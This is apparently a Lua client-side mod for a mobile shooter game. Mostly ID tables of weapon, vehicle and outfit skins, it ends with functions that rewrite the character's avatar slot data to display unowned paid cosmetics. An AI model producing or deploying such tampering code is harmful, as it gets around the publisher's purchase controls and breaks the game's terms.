    [1101001116]={1010011106,1010011107,1010011108,0,1010011109,1010011112,1010011105,1010011104,1010011103,0,1010011102,0,0,0,0,0,0,0,0,0,0,0},
    [1101001128]={1010011232,1010011233,1010011234,1010011228,1010011227,1010011229,1010011226,1010011225,1010011224,1010011223,1010011222,0,0,0,0,0,0,0,0,0,0,0},
    [1101001154]={1010011487,1010011488,1010011489,1010011493,1010011490,1010011494,1010011486,1010011485,1010011484,1010011483,1010011482,1010011497,0,0,0,0,0,0,0,0,1010011498,0},
    [1101001174]={1010011667,1010011668,1010011669,1010011673,1010011670,1010011674,1010011666,1010011665,1010011664,1010011663,1010011662,0,0,0,0,0,0,0,0,0,0,0},
    [1101001213]={1010012067,1010012068,1010012069,1010012072,1010012070,1010012073,1010012066,1010012065,1010012064,1010012063,1010012062,0,0,0,0,0,0,0,0,0,1010012074,0},
    [1101001231]={1010012267,1010012268,1010012269,1010012273,1010012272,1010012274,1010012266,1010012265,1010012264,1010012263,1010012262,1010012075,0,0,0,0,0,0,0,0,1010012275,0},
    [1101001242]={1010012357,1010012358,1010012359,1010012363,1010012362,1010012364,1010012356,1010012355,1010012354,1010012353,1010012352,1010012276,0,0,0,0,0,0,0,0,1010012365,0},
    [1101001249]={1010012437,1010012438,1010012439,1010012443,1010012442,1010012444,1010012436,1010012435,1010012434,1010012433,1010012432,1010012366,0,0,0,0,0,0,0,0,1010012445,0},
    [1101001256]={1010012588,1010012589,1010012590,1010012593,1010012592,1010012594,1010012587,1010012586,1010012585,1010012584,1010012583,1010012582,0,0,0,0,0,0,0,0,1010012595,0},
    [1101001265]={1010012698,1010012699,1010012700,1010012703,1010012702,1010012704,1010012697,1010012696,1010012695,1010012694,1010012693,1010012692,0,0,0,0,0,0,0,0,1010012705,0},
    [1101001276]={1010012698,1010012699,1010012700,1010012703,1010012702,1010012704,1010012697,1010012696,1010012695,1010012694,1010012693,1010012692,0,0,0,0,0,0,0,0,1010012705,0},
    [1101002029]={1010020249,1010020250,1010020255,1010020247,1010020246,1010020248,1010020240,1010020239,1010020238,1010020237,1010020236,1010020235,0,0,0,0,0,0,0,1010020257,1010020256,1010020258},
    [1101002056]={1010020519,0,0,1010020517,1010020516,1010020518,1010020500,1010020509,1010020508,1010020507,1010020506,1010020505,0,0,0,0,0,0,0,0,0,0},
    [1101002081]={1010020768,1010020769,1010020770,1010020766,1010020760,1010020767,1010020759,1010020758,1010020757,1010020756,1010020755,1010020776,0,0,0,0,0,0,0,1010020775,1010020777,1010020778},
    [1101003070]={1010030654,1010030653,1010030655,1010030649,1010030648,1010030650,1010030647,1010030646,1010030645,1010030644,1010030643,1010030642,0,1010030658,1010030656,1010030660,1010030662,1010030659,1010030657,0,1010030663,0},
    [1101003080]={1010030754,1010030753,1010030755,1010030749,1010030748,1010030750,1010030747,1010030746,1010030745,1010030744,1010030743,1010030742,0,1010030758,1010030756,1010030760,1010030762,1010030759,1010030757,0,1010030763,0},
    [1101003099]={1010030943,1010030944,1010030945,1010030939,1010030938,1010030942,1010030937,1010030936,1010030935,1010030934,1010030933,1010030932,0,1010030947,1010030946,1010030948,1010030949,1010030953,1010030952,0,1010030955,0},
    [1101003119]={1010031139,1010031140,1010031142,1010031138,1010031137,1010031146,1010031136,1010031135,1010031134,1010031133,1010031132,0,0,1010031144,1010031143,0,0,0,1010031145,0,0,0},
    [1101003146]={1010031229,1010031230,1010031237,1010031228,1010031227,1010031242,1010031226,1010031225,1010031224,1010031223,1010031222,0,0,1010031239,1010031238,0,0,0,1010031240,0,0,0},
    [1101003167]={1010031609,1010031610,1010031613,1010031608,1010031607,1010031617,1010031606,1010031605,1010031604,1010031603,1010031602,1010031618,0,1010031615,1010031614,1010031620,1010031622,1010031619,1010031616,0,1010031623,0},
    [1101003181]={1010031765,1010031764,1010031766,1010031759,1010031758,1010031763,1010031757,1010031756,1010031755,1010031754,1010031753,1010031752,0,1010031769,1010031767,1010031773,1010031774,1010031772,1010031768,0,1010031775,0},
    [1101003195]={1010031912,1010031911,1010031913,1010031908,1010031907,1010031909,1010031906,1010031905,1010031904,1010031903,1010031902,1010031901,0,1010031916,1010031914,1010031918,1010031919,1010031917,1010031915,0,1010031921,0},
    [1101003208]={1010032034,1010032033,1010032045,1010032029,1010032028,1010032032,1010032027,1010032026,1010032025,1010032024,1010032023,1010032022,0,1010032038,1010032036,1010032042,1010032043,1010032039,1010032037,0,1010032044,0},
    [1101004046]={1010040474,1010040475,1010040476,1010040472,1010040471,1010040473,1010040470,1010040469,1010040468,1010040467,1010040466,1010040481,0,1010040479,1010040477,1010040482,1010040483,1010040484,1010040478,1010040480,1010040485,0},
    [1101004062]={1010040578,1010040577,1010040579,1010040575,1010040570,1010040576,1010040569,1010040568,1010040567,1010040566,1010040565,1010040564,0,1010040585,1010040580,1010040587,1010040588,1010040589,1010040584,1010040586,1010040590,1010040594},
    [1101004098]={1010040924,1010040926,1010040925,0,1010040937,1010040938,1010040935,1010040934,1010040929,1010040928,1010040927,0,0,1010040939,1010040945,0,0,0,1010040944,1010040936,0,0},
    [1101004138]={1010041136,1010041137,1010041138,1010041134,1010041129,1010041135,1010041128,1010041127,1010041126,1010041125,1010041124,0,0,1010041145,1010041139,0,0,0,1010041144,1010041146,0,0},
    [1101004163]={1010041570,1010041574,1010041575,1010041568,1010041567,1010041569,1010041566,1010041565,1010041564,1010041560,1010041554,0,0,1010041578,1010041576,0,0,0,1010041577,1010041579,0,0},
    [1101004201]={1010041956,1010041957,1010041958,1010041950,1010041949,1010041955,1010041948,1010041947,1010041946,1010041945,1010041944,1010041967,0,1010041965,1010041959,0,0,0,1010041960,1010041966,0,0},
    [1101004209]={1010042038,1010042037,1010042039,1010042035,1010042034,1010042036,1010042029,1010042028,1010042027,1010042026,1010042025,1010042024,0,1010042046,1010042044,1010042048,1010042049,1010042054,1010042045,1010042047,1010042055,0},
    [1101004218]={1010042128,1010042127,1010042129,1010042125,1010042124,1010042126,1010042119,1010042118,1010042117,1010042116,1010042115,1010042114,0,1010042136,1010042134,1010042138,1010042139,1010042144,1010042135,1010042137,1010042145,0},
    [1101004226]={1010042238,1010042237,1010042239,1010042235,1010042234,1010042236,1010042233,1010042232,1010042231,1010042219,1010042218,1010042217,0,1010042243,1010042241,1010042245,1010042246,1010042247,1010042242,1010042244,1010042248,0},
    [1101004246]={1010042406,1010042407,1010042408,1010042404,1010042400,1010042405,1010042399,1010042398,1010042397,1010042396,1010042395,1010042394,0,1010042414,1010042409,1010042416,1010042417,1010042418,1010042410,1010042415,1010042419,1010042420},
    [1101005038]={0,0,1010050327,1010050329,1010050328,1010050330,1010050326,1010050325,1010050324,1010050323,1010050322,1010050334,0,0,0,0,0,0,0,0,0,0},
    [1101005052]={0,0,1010050467,1010050469,1010050468,1010050470,1010050466,1010050465,1010050464,1010050463,1010050462,1010050473,0,0,0,0,0,0,0,0,0,0},
    [1101005098]={0,0,1010050928,1010050930,1010050929,1010050932,1010050927,1010050926,1010050925,1010050924,1010050923,1010050922,0,0,0,0,0,0,0,0,0,0},
    [1101006062]={1010060573,1010060572,1010060574,1010060564,1010060563,1010060571,1010060562,1010060561,1010060554,1010060553,1010060552,1010060551,0,1010060583,1010060581,1010060591,1010060592,1010060584,1010060582,0,1010060593,0},
    [1101006075]={1010060702,1010060701,1010060703,1010060698,1010060697,1010060699,1010060696,1010060695,1010060694,1010060693,1010060692,1010060691,0,1010060706,1010060704,1010060708,1010060709,1010060707,1010060705,0,1010060711,0},
    [1101006085]={1010060796,1010060795,1010060797,1010060793,1010060789,1010060794,1010060788,1010060787,1010060786,1010060785,1010060784,1010060783,0,1010060800,1010060798,1010060804,1010060805,1010060803,1010060799,0,1010060806,0},
    [1101007046]={1010070410,1010070413,1010070414,1010070408,1010070407,1010070409,1010070406,1010070405,1010070404,1010070403,1010070402,1010070418,0,1010070417,1010070415,1010070420,1010070422,1010070419,1010070416,0,1010070423,0},
    [1101007062]={1010070579,1010070578,1010070581,1010070576,1010070575,1010070577,1010070574,1010070573,1010070572,1010070571,1010070569,1010070568,0,1010070584,1010070582,1010070585,1010070586,1010070587,1010070583,0,1010070588,0},
    [1101007071]={1010070663,1010070662,1010070664,1010070659,1010070658,1010070660,1010070657,1010070656,1010070655,1010070654,1010070653,1010070652,0,1010070667,1010070665,1010070668,1010070669,1010070670,1010070666,0,1010070672,0},
    [1101008051]={1010080463,1010080464,1010080465,1010080459,1010080458,1010080462,1010080457,1010080456,1010080455,1010080454,1010080453,1010080452,0,1010080467,1010080466,1010080468,1010080469,1010080473,1010080472,0,1010080475,0},
    [1101008061]={1010080563,1010080564,1010080565,1010080559,1010080558,1010080562,1010080557,1010080556,1010080555,1010080554,1010080553,0,0,1010080567,1010080566,0,0,0,1010080572,0,0,0},
    [1101008070]={1010080609,1010080612,1010080613,1010080608,1010080607,1010080617,1010080606,1010080605,1010080604,1010080603,1010080602,0,0,1010080615,1010080614,0,0,0,1010080616,0,0,0},
    [1101008081]={1010080740,1010080743,1010080745,1010080738,1010080737,1010080739,1010080736,1010080735,1010080734,1010080733,1010080732,1010080748,0,1010080747,1010080746,1010080750,1010080752,1010080749,1010080744,0,1010080753,0},
    [1101008104]={1010080980,1010080982,1010080984,1010080978,1010080977,1010080979,1010080976,1010080975,1010080974,1010080973,1010080972,1010080992,0,1010080986,1010080985,1010080989,1010080987,1010080993,1010080983,0,1010080988,0},
    [1101008116]={1010081110,1010081112,1010081114,1010081108,1010081107,1010081109,1010081106,1010081105,1010081104,1010081103,1010081102,0,0,1010081116,1010081115,0,0,0,1010081113,0,0,0},
    [1101008126]={1010081210,1010081225,1010081226,1010081208,1010081207,1010081209,1010081206,1010081205,1010081204,1010081203,1010081202,1010081218,0,1010081217,1010081216,1010081219,1010081220,1010081222,1010081214,1010081228,1010081227,1010081229},
    [1101008136]={1010081314,1010081315,1010081316,1010081312,1010081308,1010081313,1010081307,1010081306,1010081305,1010081304,1010081303,1010081302,0,1010081318,1010081317,1010081322,1010081323,1010081325,1010081324,0,1010081326,0},
    [1101008146]={1010081401,1010081402,1010081403,1010081398,1010081397,1010081399,1010081396,1010081395,1010081394,1010081393,1010081392,1010081391,0,1010081405,1010081404,1010081406,1010081407,1010081409,1010081408,0,1010081411,0},
    [1101008154]={1010081531,1010081532,1010081533,1010081528,1010081527,1010081529,1010081526,1010081525,1010081524,1010081523,1010081522,1010081521,0,1010081541,1010081534,1010081542,1010081543,1010081545,1010081544,0,1010081546,0},
    [1101008163]={1010081582,1010081583,1010081584,1010081579,1010081578,1010081580,1010081577,1010081576,1010081575,1010081574,1010081573,1010081572,0,1010081586,1010081585,1010081587,1010081588,1010081590,1010081589,0,1010081592,0},
    [1101012033]={1010120284,1010120285,1010120286,1010120280,1010120279,1010120283,1010120278,1010120277,1010120276,1010120275,1010120274,1010120273,0,0,0,0,0,0,0,0,1010120287,0},
    [1101100012]={1011000066,1011000067,1011000068,0,0,0,1011000058,1011000057,1011000056,1011000055,1011000054,1011000053,0,0,0,0,0,0,0,0,1011000073,0},
    [1101102007]={1011010025,1011010024,1011010026,1011010020,1011010019,1011010023,1011010018,1011010017,1011010016,1011010015,1011010014,1011010013,0,0,0,0,0,0,0,0,1011010027,0},
    [1101102017]={1011020027,1011020028,1011020029,1011020025,1011020024,1011020026,1011020019,1011020018,1011020017,1011020016,1011020015,1011020014,0,1011020036,1011020034,1011020038,1011020039,1011020044,1011020035,1011020037,1011020045,1011020047},
    [1101102025]={1011020127,1011020128,1011020129,1011020125,1011020124,1011020126,1011020119,1011020118,1011020117,1011020116,1011020115,1011020114,0,1011020136,1011020134,1011020138,1011020139,1011020144,1011020135,1011020137,1011020145,0},
    [1101102041]={1011020214,1011020215,1011020216,1011020212,1011020211,1011020213,1011020209,1011020208,1011020207,1011020206,1011020205,1011020204,0,1011020219,1011020217,1011020222,1011020223,1011020224,1011020218,1011020221,1011020225,1011020229},
    [1101102049]={1011020356,1011020357,1011020358,1011020354,1011020350,1011020355,1011020349,1011020348,1011020347,1011020346,1011020345,1011020344,0,1011020364,1011020359,1011020366,1011020367,1011020368,1011020360,1011020365,1011020369,1011020370},
    [1101101007]={1011020436,1011020437,1011020438,1011020434,1011020430,1011020435,1011020429,1011020428,1011020427,1011020426,1011020425,1011020424,0,1011020444,1011020439,1011020446,1011020447,1011020448,1011020440,1011020445,1011020449,1011020450},
    [1102001120]={1020011137,1020011138,1020011139,1020011135,1020011134,1020011136,1020011133,1020011132,0,0,0,0,0,0,0,0,0,0,0,1020011142,0,0},
    [1102001130]={1020011247,1020011248,1020011249,1020011245,1020011244,1020011246,1020011243,1020011242,0,0,0,0,0,0,0,0,0,0,0,1020011250,0,0},
    [1102002043]={1020020372,1020020374,1020020373,1020020383,1020020380,1020020384,1020020379,1020020378,1020020377,1020020376,1020020375,1020020388,0,1020020385,1020020387,0,0,0,1020020386,0,0,0},
    [1102002061]={1020020552,1020020554,1020020553,1020020563,1020020562,1020020564,1020020559,1020020558,1020020557,1020020556,1020020555,1020020578,0,1020020565,1020020567,1020020573,1020020574,1020020572,1020020566,0,1020020569,0},
    [1102002136]={1020021314,1020021313,1020021315,1020021309,1020021308,1020021312,1020021307,1020021306,1020021305,1020021304,1020021303,1020021302,0,1020021318,1020021316,1020021323,1020021324,1020021322,1020021317,0,1020021325,0},
    [1102002424]={1020024193,1020024192,1020024194,1020024189,1020024188,1020024190,1020024187,1020024186,1020024185,1020024184,1020024183,1020024182,0,1020024197,1020024195,1020024199,1020024200,1020024198,1020024196,0,1020024202,0},
    [1102003080]={1020030755,1020030756,1020030758,0,1020030749,1020030754,1020030748,1020030747,1020030746,1020030745,1020030744,1020030764,0,1020030760,0,1020030759,1020030757,0,0,1020030765,0,0},
    [1102003100]={1020030956,1020030957,1020030958,1020030954,1020030950,1020030955,1020030949,1020030948,1020030947,1020030946,1020030945,1020030944,0,1020030964,0,1020030960,1020030959,1020030965,0,1020030967,1020030966,1020030968},
    [1102005064]={1020050588,1020050589,1020050590,0,0,0,1020050587,1020050586,1020050585,1020050584,1020050583,1020050582,0,0,0,0,0,0,0,0,1020050592,0},
    [1103001101]={1030010954,1030010955,1030010956,0,0,0,0,0,0,0,1030010953,1030010952,1030010951,0,0,0,0,0,0,1030010957,0,1030010958},
    [1103001146]={1030011344,1030011345,1030011346,0,0,0,0,0,0,0,1030011343,1030011342,1030011341,0,0,0,0,0,0,1030011347,0,1030011348},
    [1103001154]={1030011484,1030011485,1030011486,0,0,0,0,0,0,0,1030011483,1030011482,1030011481,0,0,0,0,0,0,1030011487,0,1030011488},
    [1103001179]={1030011738,1030011739,1030011741,0,0,0,1030011737,1030011736,1030011735,1030011734,1030011733,1030011732,1030011731,0,0,0,0,0,0,1030011742,1030011743,1030011744},
    [1103001191]={1030011858,1030011859,1030011861,0,0,0,1030011857,1030011856,1030011855,1030011854,1030011853,1030011852,1030011851,0,0,0,0,0,0,1030011862,1030011863,1030011864},
    [1103001202]={1030011948,1030011949,1030011950,0,0,0,1030011947,1030011946,1030011945,1030011944,1030011943,1030011942,1030011941,0,0,0,0,0,0,1030011951,1030011952,1030011953},
    [1103002030]={1030020245,1030020246,1030020247,1030020252,1030020249,1030020253,1030020258,1030020257,1030020256,1030020255,1030020244,1030020243,1030020242,0,0,0,0,0,0,1030020248,0,0},
    [1103002059]={1030020544,1030020545,1030020546,1030020542,1030020539,1030020543,1030020538,1030020537,1030020536,1030020535,1030020534,1030020533,1030020532,0,0,0,0,0,0,1030020547,1030020548,0},
    [1103002087]={1030020824,1030020825,1030020826,0,0,0,1030020818,1030020817,1030020816,1030020815,1030020814,1030020813,1030020812,0,0,0,0,0,0,1030020827,1030020828,0},
    [1103002106]={1030021009,1030021010,1030021012,1030021015,1030021014,1030021016,1030021008,1030021007,1030021006,1030021005,1030021004,1030021003,1030021002,0,0,0,0,0,0,1030021013,1030021017,0},
    [1103002113]={1030021079,1030021080,1030021082,1030021085,1030021084,1030021086,1030021078,1030021077,1030021076,1030021075,1030021074,1030021073,1030021072,0,0,0,0,0,0,1030021083,1030021087,0},
    [1103003022]={1030030165,1030030166,1030030167,1030030172,1030030169,1030030173,0,0,0,0,1030030164,1030030163,1030030162,0,0,0,0,0,0,0,0,0},
    [1103003030]={1030030256,1030030257,1030030258,1030030254,1030030253,1030030255,1030030248,1030030247,1030030246,1030030245,1030030244,1030030243,1030030242,0,0,0,0,0,0,1030030259,1030030249,0},
    [1103003042]={1030030374,1030030375,1030030376,1030030372,1030030369,1030030373,0,0,0,0,1030030364,1030030363,1030030362,0,0,0,0,0,0,1030030377,0,0},
    [1103003051]={1030030458,1030030459,1030030460,1030030456,1030030455,1030030457,0,0,0,0,1030030454,1030030453,1030030452,0,0,0,0,0,0,1030030463,0,0},
    [1103003062]={1030030568,1030030569,1030030570,1030030566,1030030565,1030030567,0,0,0,0,1030030564,1030030563,1030030562,0,0,0,0,0,0,1030030572,0,0},
    [1103003079]={1030030744,1030030745,1030030746,1030030742,1030030740,1030030743,1030030738,1030030737,1030030736,1030030735,1030030734,1030030733,1030030732,0,0,0,0,0,0,1030030747,1030030739,0},
    [1103003087]={1030030825,1030030826,1030030827,1030030823,1030030824,1030030824,1030030818,1030030817,1030030816,1030030815,1030030814,1030030813,1030030812,0,0,0,0,0,0,1030030828,1030030819,0},
    [1103004037]={1030040315,1030040316,1030040317,1030040325,1030040324,1030040323,0,0,0,0,1030040314,1030040313,1030040312,1030040327,1030040326,0,0,0,1030040328,1030040329,0,0},
    [1103006030]={1030060245,1030060246,1030060247,0,1030060253,1030060252,0,0,0,0,1030060244,1030060243,1030060242,0,0,0,0,0,0,0,0,0},
    [1103007028]={1030070233,1030070234,1030070235,1030070226,1030070225,1030070227,1030070218,1030070217,1030070216,1030070215,1030070214,1030070213,1030070212,0,0,0,0,0,0,1030070236,1030070219,0},
    [1103012010]={0,0,0,0,0,0,1030120038,1030120037,1030120036,1030120035,1030120034,1030120033,1030120032,0,0,0,0,0,0,0,0,0},
    [1103012019]={0,0,0,0,0,0,1030120138,1030120137,1030120136,1030120135,1030120134,1030120133,1030120132,0,0,0,0,0,0,0,0,0},
    [1103012031]={0,0,0,0,0,0,1030120258,1030120257,1030120256,1030120255,1030120254,1030120253,1030120252,0,0,0,0,0,0,0,0,0},
    [1103012039]={0,0,0,0,0,0,1030120339,1030120338,1030120337,1030120336,1030120335,1030120334,1030120333,0,0,0,0,0,0,0,0,0},
    [1103102007]={1031020026,1031020027,1031020028,1031020024,1031020023,1031020025,1031020019,1031020018,1031020017,1031020016,1031020015,1031020014,1031020013,0,0,0,0,0,0,1031020029,0,0},
    [1105001034]={0,0,0,0,1050010287,1050010289,1050010286,1050010285,1050010284,1050010283,1050010282,0,0,0,0,0,0,0,0,1050010292,0,0},
    [1105001048]={0,0,0,1050010429,1050010428,1050010434,1050010427,1050010426,1050010425,1050010424,1050010423,0,0,0,0,0,0,0,0,1050010435,0,1050010436},
    [1105001069]={0,0,0,1050010639,1050010638,1050010640,1050010637,1050010636,1050010635,1050010634,1050010633,1050010645,0,0,0,0,0,0,0,1050010643,1050010646,1050010644},
    [1105002091]={0,0,0,0,0,0,1050020847,1050020846,1050020845,1050020844,1050020843,1050020842,0,0,0,0,0,0,0,0,0,1050020848},
    [1105010019]={0,0,0,0,0,0,1050100144,1050100143,1050100142,1050100141,1050100139,1050100138,0,0,0,0,0,0,0,0,0,0}
}

_G.BaseAttachToIndex = {
    [201010]=1, [201005]=1, [201004]=1, [201009]=2, [201003]=2, [201002]=2, 
    [201011]=3, [201007]=3, [201006]=3, [204012]=4, [204005]=4, [204008]=4, 
    [204011]=5, [204004]=5, [204007]=5, [204013]=6, [204006]=6, [204009]=6, 
    [203001]=7, [203002]=8, [203003]=9, [203014]=10, [203004]=11, [203015]=12, [203005]=13, 
    [202002]=14, [202001]=15, [202004]=16, [202005]=17, [202007]=18, [202006]=19, 
    [205002]=20, [205003]=20, [205001]=20, [203018]=21, [204014]=22 
}

_G.VipAttachToIndex = {}
for skinId, attachList in pairs(_G.VIP_Attachments) do
    for index, attachId in ipairs(attachList) do
        if attachId > 0 then
            _G.VipAttachToIndex[attachId] = index
        end
    end
end

_G.WeaponSkinMap = _G.WeaponSkinMap or {}
_G.VehicleSkinMap = _G.VehicleSkinMap or {}
_G.OutfitMap = _G.OutfitMap or {}
_G.skinIdCache = _G.skinIdCache or {}
_G.skinIdCache2 = _G.skinIdCache2 or {}

_G.OutfitSkins = {
    Suit = {403003,1407916,1406469,1405870,1407140,1407141,1407142,1407550,1406638,1406872,1406971,1407103,1407512,1407391,1407366,1407330,1407329,1407286,1407285,1407277,1407276,1407275,1407225,1407224,1407259,1407161,1407160,1407107,1407106,1407079,1407048,1406977,1406976,1406898,1400569,1404000,1404049,1400119,1400117,1406060,1406891,1400687,1405160,1405145,1405436,1405435,1405434,1405064,1405207,1406895,1400333,1400377,1405092,1405121,1406889,1407278,1407279,1407381,1407380,1407385,1406389,1406388,1406387,1406386,1406385,1406140,1400782,1407392,1407318,1407317,1407404,1407402,1407401,1407387,1404434,1404437,1404440,1404448,1400324,1400708,1404043,1404048,1405953,1400101,1404153,1407440,1407441},
    Bag = {
        {501001, 501002, 501003}, {1501001174, 1501002174, 1501003174}, {1501001220, 1501002220, 1501003220},
        {1501001051, 1501002051, 1501003051}, {1501001443, 1501002443, 1501003443}, {1501001265, 1501002265, 1501003265},
        {1501001321, 1501002321, 1501003321}, {1501001277, 1501002277, 1501003277}, {1501001550, 1501002550, 1501003550},
        {1501001592, 1501002592, 1501003592}, {1501001608, 1501002608, 1501003608}, {1501001024, 1501002024, 1501003024},
        {1501001019, 1501002019, 1501003019}, {1501001179, 1501002179, 1501003179}, {1501001194, 1501002194, 1501003194},
        {1501001346, 1501002346, 1501003346}
    },
    Helmet = {
        {502001, 502002, 502003}, {1502001014, 1502002014, 1502003014}, {1502001349, 1502002349, 1502003349},
        {1502001012, 1502002012, 1502003012}, {1502001009, 1502002009, 1502003009}, {1502001397, 1502002397, 1502003397},
        {1502001390, 1502002390, 1502003390}, {1502001381, 1502002381, 1502003381}, {1502001358, 1502002358, 1502003358},
        {1502001350, 1502002350, 1502003350}, {1502001342, 1502002342, 1502003342}
    },
    Pet = {50000,50001,50002,50003,50004,50005,50006,50021,50022,50038,50039,50040}
}

_G.skinIdMappings = {
    [101004]={101004,1101004046,1101004246,1101004226,1101004236,1101004062,1101004078,1101004086,1101004201,1101004218},
    [101001]={101001,1101001276,1101001089,1101001213,1101001172,1101001127,1101001230,1101001241},                    
    [101003]={101003,1101003227,1103003208,1101003195,1101003187,1101003098,1101003166,1101003218},                    
    [102002]={102002,1102002136,1102002043,1102002061,1102002424},                                          
    [101008]={101008,1101008146,1101008154,1101008079,1101008126,1101008104,1101008146,1101008061,1101008116},                    
    [101006]={101006,1101006085,1101006061,1101006074,1101006043,1101006032,1101006084},
    [102001]={102001, 1102001120},
    [101005]={101005, 1101005098},
    [104003]={104003, 1104003037},
    [104004]={104004, 1104004035, 1104004041}
}

_G.VehicleSkins = { 
    [1961001] = { 1961007, 1961010, 1961012, 1961013, 1961014, 1961015, 1961016, 1961017, 1961018, 1961020, 1961021, 1961024, 1961025, 1961029, 1961030, 1961031, 1961032, 1961033, 1961034, 1961035, 1961036, 1961037, 1961038, 1961039, 1961040, 1961041, 1961042, 1961043, 1961044, 1961045, 1961046, 1961047, 1961048, 1961049, 1961050, 1961051, 1961052, 1961053, 1961054, 1961055, 1961056, 1961057, 1961058, 1961059, 1961060, 1961061, 1961062, 1961063, 1961064, 1961065, 1961066, 1961067, 1961068, 1961069, 1961136, 1961137, 1961138, 1961139, 1961140, 1961141, 1961142, 1961143, 1961144, 1961145, 1961147, 1961148, 1961149, 1961150, 1961151, 1961152, 1961153 },
    [1903001] = { 1903005, 1903006, 1903007, 1903008, 1903011, 1903012, 1903013, 1903014, 1903015, 1903016, 1903017, 1903018, 1903019, 1903020, 1903021, 1903022, 1903023, 1903024, 1903029, 1903030, 1903031, 1903032, 1903033, 1903034, 1903035, 1903036, 1903037, 1903039, 1903040, 1903041, 1903042, 1903043, 1903044, 1903045, 1903046, 1903051, 1903052, 1903053, 1903054, 1903055, 1903056, 1903057, 1903058, 1903059, 1903060, 1903061, 1903062, 1903063, 1903066, 1903067, 1903068, 1903069, 1903070, 1903071, 1903072, 1903073, 1903074, 1903075, 1903076, 1903079, 1903080, 1903081, 1903082, 1903084, 1903085, 1903086, 1903087, 1903088, 1903089, 1903090, 1903189, 1903190, 1903191, 1903192, 1903193, 1903194, 1903195, 1903196, 1903197, 1903198, 1903199, 1903200, 1903201, 1903202, 1903203, 1903204, 1903205, 1903206, 1903207, 1903208, 1903209, 1903210, 1903211, 1903212, 1903213, 1903214, 1903215, 1903216, 1903217, 1903218, 1903219, 1903220, 1903221, 1903222, 1903223, 1903225, 1903226, 1903227, 1903228 }, 
    [1915001] = { 1915002, 1915003, 1915004, 1915005, 1915006, 1915007, 1915008, 1915009, 1915010, 1915011, 1915012, 1915013, 1915014, 1915015, 1915016, 1915017, 1915018, 1915019, 1915020, 1915021, 1915022, 1915023, 1915024, 1915025, 1915026, 1915027, 1915099 },          
    [1908001] = { 1908002, 1908003, 1908005, 1908006, 1908007, 1908008, 1908009, 1908010, 1908011, 1908012, 1908013, 1908015, 1908016, 1908017, 1908018, 1908019, 1908021, 1908023, 1908030, 1908031, 1908032, 1908033, 1908034, 1908035, 1908036, 1908037, 1908039, 1908040, 1908041, 1908043, 1908047, 1908049, 1908050, 1908051, 1908052, 1908053, 1908054, 1908055, 1908056, 1908057, 1908059, 1908060, 1908061, 1908062, 1908063, 1908064, 1908066, 1908067, 1908068, 1908069, 1908070, 1908075, 1908076, 1908077, 1908078, 1908080, 1908081, 1908082, 1908083, 1908084, 1908085, 1908086, 1908087, 1908088, 1908089, 1908091, 1908094, 1908095, 1908096, 1908097, 1908098, 1908099, 1908100, 1908101, 1908102, 1908104, 1908105, 1908106, 1908107, 1908108, 1908109, 1908110, 1908111, 1908112, 1908188, 1908189 },   
    [1907001] = { 1907007, 1907008, 1907010, 1907011, 1907012, 1907013, 1907014, 1907016, 1907018, 1907019, 1907021, 1907022, 1907023, 1907025, 1907026, 1907027, 1907028, 1907029, 1907030, 1907032, 1907033, 1907034, 1907035, 1907036, 1907037, 1907038, 1907040, 1907041, 1907043, 1907044, 1907045, 1907046, 1907047, 1907048, 1907049, 1907050, 1907051, 1907052, 1907053, 1907054, 1907055, 1907056, 1907058, 1907059, 1907060, 1907061, 1907062, 1907063, 1907064, 1907065, 1907066, 1907067, 1907068, 1907069, 1907070, 1907071, 1907072, 1907073, 1907074 }
}
_G.CustSlotType = { ClothesEquipemtSlot=5, BackpackEquipemtSlot=8, HelmetEquipemtSlot=9, ParachuteEquipemtSlot=11, GlideEquipemtSlot=15 }

local function DownloadGameItem(id)
    local puffer_manager = require('client.slua.logic.download.puffer.puffer_manager')
    local puffer_const = require('client.slua.logic.download.puffer_const')
    if puffer_manager and puffer_const and puffer_manager.GetState(puffer_const.ENUM_DownloadType.ODPTD, {id}) ~= puffer_const.ENUM_DownloadState.Done then
        puffer_manager.Download(puffer_const.ENUM_DownloadType.ODPTD, {id})
    end
end
_G.download_item = DownloadGameItem

_G.get_skin_id = function(weaponID)
    if not weaponID then return nil end
    local targetSkinId = _G.WeaponSkinMap and _G.WeaponSkinMap[weaponID]
    if targetSkinId and targetSkinId > 0 then
        if not _G.skinIdCache2[targetSkinId] then
            if _G.download_item then pcall(_G.download_item, targetSkinId) end
            _G.skinIdCache2[targetSkinId] = true
        end
        return targetSkinId
    end
    return weaponID
end

_G.equip_character_avatar = function(Character)
    if not Character or not slua.isValid(Character) or not Character.AvatarComponent2 then return end
    local BackpackUtils = import("BackpackUtils")
    local SlotSyncData = Character.AvatarComponent2.NetAvatarData and Character.AvatarComponent2.NetAvatarData.SlotSyncData
    if not SlotSyncData or not slua.isValid(SlotSyncData) or not BackpackUtils then return end
    
    local function EquipAvatar(ApplyDataIdx, mappedSkin, ApplyEquipSlot, isLevelDependent, levelFunc)
        if not mappedSkin or mappedSkin == 0 then return end
        local slotData = SlotSyncData:Get(ApplyDataIdx)
        if slotData and slotData.SlotID == ApplyEquipSlot then
            local applyItemId = mappedSkin
            if isLevelDependent and type(mappedSkin) == "table" then
                local level = levelFunc(slotData.AdditionalItemID) or 1
                if level < 1 then level = 1 end
                if level > 3 then level = 3 end
                applyItemId = mappedSkin[level] or mappedSkin[1]
            end

            if not applyItemId or applyItemId == 0 or slotData.ItemId == applyItemId then return end

            if not _G.skinIdCache[applyItemId] then
                if _G.download_item then pcall(_G.download_item, applyItemId) end
                _G.skinIdCache[applyItemId] = true
            end

            slotData.ItemId = applyItemId
            SlotSyncData:Set(ApplyDataIdx, slotData)
            Character.AvatarComponent2:OnRep_BodySlotStateChanged()
        end
    end

    local hasGliderSlot = false
    for i = 0, SlotSyncData:Num() - 1 do
        local slotData = SlotSyncData:Get(i)
        if slotData and slotData.SlotID == _G.CustSlotType.GlideEquipemtSlot then 
            hasGliderSlot = true
            break 
        end
    end
    if not hasGliderSlot then SlotSyncData:Add({ SlotID = _G.CustSlotType.GlideEquipemtSlot, ItemId = 0 }) end

    for i = 0, SlotSyncData:Num() - 1 do
        EquipAvatar(i, _G.OutfitMap.Suit or 0, _G.CustSlotType.ClothesEquipemtSlot, false)
        EquipAvatar(i, _G.OutfitMap.Bag, _G.CustSlotType.BackpackEquipemtSlot, true, BackpackUtils.GetEquipmentBagLevel)
        EquipAvatar(i, _G.OutfitMap.Helmet, _G.CustSlotType.HelmetEquipemtSlot, true, BackpackUtils.GetEquipmentHelmetLevel)
        EquipAvatar(i, _G.OutfitMap.Parachute or 0, _G.CustSlotType.ParachuteEquipemtSlot, false)
    end
end

